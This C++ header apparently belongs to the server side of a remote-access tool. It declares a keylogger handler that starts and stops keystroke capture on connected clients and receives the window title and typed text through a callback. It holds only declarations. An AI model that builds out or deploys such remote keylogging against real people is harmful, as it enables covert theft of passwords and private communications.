#pragma once
#include <string>
#include <functional>

namespace rslm {
	namespace server {
		namespace messages {
			
			using KeylogCallback = std::function<void(const std::string& windowTitle,
				                                      const std::string& text)>;

			class ServerKeyloggerHandler {

			public:
				static void Start(const std::string& clientId, KeylogCallback onKeylog);
				static void Stop(const std::string& clientId);
			};
		}//namespace messages
	}//namespace server
}//namesapce rslm